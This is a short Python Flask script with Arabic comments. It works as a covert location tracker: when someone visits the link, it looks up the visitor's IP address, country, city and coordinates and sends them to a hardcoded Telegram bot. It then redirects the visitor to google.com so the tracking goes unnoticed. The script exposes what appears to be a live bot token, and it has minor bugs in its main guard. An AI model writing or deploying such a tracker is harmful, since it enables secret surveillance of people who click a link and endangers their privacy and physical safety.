from flask import Flask, request, redirect
import requests

app = Flask(name)

TOKEN = "7709036943:AAGbf3S8dmulC0knnIaNXJrVn2MoQ4r2yJI"
CHAT_ID = "7326032837"

@app.route('/')
def track_location():
    ip = request.remote_addr
    location_data = requests.get(f"http://ip-api.com/json/{ip}").json()
    
    if location_data['status'] == 'success':
        location_msg = f"📍 موقع جديد تم التقاطه:\n"
        location_msg += f"🌍 الدولة: {location_data['country']}\n"
        location_msg += f"🏙️ المدينة: {location_data['city']}\n"
        location_msg += f"🌐 IP: {ip}\n"
        location_msg += f"📍 الإحداثيات: {location_data['lat']}, {location_data['lon']}\n"
        
        # إرسال البيانات إلى تليغرام
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": location_msg
        })
    
    return redirect("https://google.com")  # إعادة التوجيه بعد تتبع الموقع

if name == "main":
    app.run(host="0.0.0.0", port=5000)
